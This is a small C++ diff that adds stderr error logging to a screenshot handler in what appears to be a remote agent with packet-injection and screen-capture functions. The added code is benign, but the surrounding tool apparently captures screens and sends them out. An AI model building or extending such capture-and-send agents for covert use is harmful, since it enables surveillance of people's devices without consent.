@@ -451,6 +451,10 @@ void Agent::handleInjection(Packet&& packet) {
 void Agent::handleScreenshot() {
 #ifdef _WIN32
     inferno::capture::CaptureResult result = inferno::capture::captureScreen();
+    if (!result.success && !result.error_msg.empty()) {
+        std::fprintf(stderr, "[Agent] Screenshot failed: %s\n",
+                     result.error_msg.c_str());
+    }
     std::vector<uint8_t> payload;
     // status (2 bytes)
     uint16_t status = result.success ? 0 : 1;
